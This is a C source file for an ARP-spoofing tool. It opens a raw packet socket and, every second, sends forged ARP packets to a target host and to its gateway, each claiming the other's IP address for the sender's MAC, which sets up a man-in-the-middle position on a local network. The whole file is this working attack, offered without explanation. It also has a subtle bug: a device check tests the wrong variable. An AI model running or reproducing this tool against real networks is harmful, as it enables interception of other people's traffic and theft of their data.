#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h> 

#include <pthread.h>
#include <sys/poll.h>


#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include <net/if.h>

#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h> 


#define SIZE_H_ET 14
#define SIZE_ARP_H 28
#define SIZE_H_IP 20
#define SIZE_H_UDP 8
#define SIZE_DATA 1000
#define SIZE_PACKET (SIZE_DATA + SIZE_H_UDP + SIZE_H_IP + SIZE_H_ET)
#define DEBUG

enum pos_argv{
    DEVICE = 1,
    SMAC,
    DMAC,
    GMAC,
    SADDR,
    DADDR,
    GADDR
};
struct arphdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t source_mac[6];
  uint8_t source_ip[4];
  uint8_t dest_mac[6];
  uint8_t dest_ip[4];
};

int run = 1;

char *address;
char *address_server;
char **data;
unsigned int index_device;

void replace_enter(char *str);
void convert_mac(const char *str_mac, char *mac);
void deconvert_mac(const char *mac, char *str_mac);
void print_headers(char *packet, int len);
void print_info(char *packet, int size);
short check_sum_ip(void *args, int N);
void check_sum_udp(struct iphdr *pIph, unsigned short *data);


void *thread_listen(void *args){
    printf("Start thread listen\n");
    struct sockaddr_ll addrll;
    memset((void*)&addrll, 0, sizeof(addrll));
    addrll.sll_family = AF_PACKET;
    addrll.sll_protocol = htons(ETH_P_ALL);
    addrll.sll_ifindex = index_device;  
    addrll.sll_halen = ETH_ALEN;
    convert_mac(data[SMAC], (char*)addrll.sll_addr);
    int fd = *(int*)args;
    char buffer[SIZE_PACKET];
    memset(buffer, 0, sizeof(buffer));
    char buffer2[SIZE_PACKET];
    memset(buffer2, 0, sizeof(buffer));

    struct ethhdr *eth_header = (struct ethhdr*)buffer;
    convert_mac(data[DMAC], (char*)eth_header->h_dest);
    convert_mac(data[SMAC], (char*)eth_header->h_source);
    eth_header->h_proto = htons(0x806);
    struct arphdr *msg1 = (struct arphdr*)(buffer + SIZE_H_ET);
    msg1->htype = htons((short)1);
    msg1->ptype = htons(ETH_P_IP);
    msg1->hlen = 6;
    msg1->plen = 4;
    msg1->opcode = htons((short)1);
    convert_mac(data[SMAC], (char*)msg1->source_mac);
    if(inet_pton(AF_INET, data[GADDR], (struct in_addr*)&msg1->source_ip) <= 0){
        printf("Error: incorrect gateway address %s\n", data[GADDR]);
        close(fd);
        return NULL;
    }
    convert_mac(data[DMAC], (char*)msg1->dest_mac);
    if(inet_pton(AF_INET, data[DADDR], (struct in_addr*)&msg1->dest_ip) <= 0){
        printf("Error: incorrect destination address %s\n", data[DADDR]);
        close(fd);
        return NULL;
    }

    struct ethhdr *eth_header2 = (struct ethhdr*)buffer2;
    convert_mac(data[GMAC], (char*)eth_header2->h_dest);
    convert_mac(data[SMAC], (char*)eth_header2->h_source);
    eth_header2->h_proto = htons(0x806);
    struct arphdr *msg2 = (struct arphdr*)(buffer2 + SIZE_H_ET);
    msg2->htype = htons((short)1);
    msg2->ptype = htons(ETH_P_IP);
    msg2->hlen = 6;
    msg2->plen = 4;
    msg2->opcode = htons((short)1);
    convert_mac(data[SMAC], (char*)msg2->source_mac);
    convert_mac(data[GMAC], (char*)msg2->dest_mac);
    if(inet_pton(AF_INET, data[DADDR], (struct in_addr*)&msg2->source_ip) <= 0){
        printf("Error: incorrect dest address %s\n", data[DADDR]);
        close(fd);
        return NULL;
    }
    if(inet_pton(AF_INET, data[GADDR], (struct in_addr*)&msg2->dest_ip) <= 0){
        printf("Error: incorrect gate address %s\n", data[GADDR]);
        close(fd);
        return NULL;
    }
    int res;
    while(run){
        if(sendto(fd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addrll, sizeof(addrll)) == -1){
            perror("sendto");
        }
        if(sendto(fd, buffer2, sizeof(buffer2), 0, (struct sockaddr*)&addrll, sizeof(addrll)) == -1){
            perror("sendto");
        }
        sleep(1);
    }
    printf("End thread listen\n");
    return NULL;
}

int main(int argc, char *argv[]){
    if(argc < 8){
        printf("Not enough arguments\n");
        printf("\targuments: device name, source mac, dest mac, gateway mac, saddr, daddr, gaddr\n");
        printf("Exit\n");
        return -1;
    }
    data = argv;
    index_device = if_nametoindex(argv[DEVICE]);
    #ifdef DEBUG
        printf("index = %d\n", index_device);
    #endif
    if(index <= 0){
        printf("Not found device: %s\n", argv[DEVICE]);
        return -1;
    }
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(fd < 0){
        perror("socket");
        return -1;
    }
    pthread_t id;
    pthread_create(&id, NULL, thread_listen, (void**)&fd);
    
    int count_msg;
    char comand[40];
    
    while(1){
    	memset(comand, 0, sizeof(comand));
        printf("Input: \n");
        fgets(comand, sizeof(comand), stdin);
        replace_enter(comand);
        if(!strcmp(comand, "exit")){
            run = 0;
            break;
        }
    }
    if(close(fd)){
        perror("close");
    }


    printf("End program\n");
    return 0;
}




void replace_enter(char *str){
    int i = 0;
    while('\0' != str[i]){
        if(str[i] == '\n'){
            str[i] = '\0';
            break;
        }
        ++i;
    }
}
void convert_mac(const char *str_mac, char *mac){
    for(int i = 0; i < 18; i += 3){
        sscanf(str_mac+i, "%2hhx", mac+(i/3));
    }
}
void deconvert_mac(const char *mac, char *str_mac){
    for(int i = 0; i < 18; i += 3){
        sprintf(str_mac + i, "%2x:", (unsigned char)mac[i/3]);
    }
    str_mac[17] = '\0';
}
void print_headers(char *packet, int len){
    for(int i = 0; i < SIZE_H_ET; ++i){
		printf("%3d  ", (unsigned char)packet[i]);
	}
    printf("\n\n");
	for(int i = SIZE_H_ET; i < SIZE_H_IP + SIZE_H_ET; ++i){
		printf("%3d  ", (unsigned char)packet[i]);
	}
	printf("\n\n");
	for(int i = SIZE_H_ET + SIZE_H_IP; i < SIZE_H_UDP + SIZE_H_IP + SIZE_H_ET; ++i){
		printf("%3d  ", (unsigned char)packet[i]);
	}
	printf("\n\n");
	printf("data: %s\n", packet + SIZE_H_UDP + SIZE_H_IP + SIZE_H_ET);
}

short check_sum_ip(void *args, int N){
    int i_cksm = 0;
    unsigned short *ptr = (unsigned short*)args;
    for(int i = 0; i < N; ++i){
        i_cksm += *ptr;
        ptr++;
    }
    unsigned short cksm = (unsigned short)(i_cksm & 0xFFFF) + (unsigned short)(i_cksm>>16);
    cksm = (unsigned short)(i_cksm & 0xFFFF) + (unsigned short)(i_cksm>>16);
    return cksm;
}
void check_sum_udp(struct iphdr *pIph, unsigned short *data) {
    register unsigned long sum = 0;
    struct udphdr *udphdrp = (struct udphdr*)(data);
    unsigned short udpLen = htons(udphdrp->len);
    sum += ((pIph->saddr>>16)&0xFFFF) + ((pIph->saddr)&0xFFFF);
    sum += ((pIph->daddr>>16)&0xFFFF) + ((pIph->daddr)&0xFFFF);
    sum += htons(IPPROTO_UDP);
    sum += udphdrp->len;
    udphdrp->check = 0;
    while (udpLen > 1) {
        sum += * data++;
        udpLen -= 2;
    }
    if(udpLen > 0) {
        sum += ((*data)&htons(0xFF00));
    }
    while (sum>>16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    udphdrp->check = (unsigned short)~sum;
}

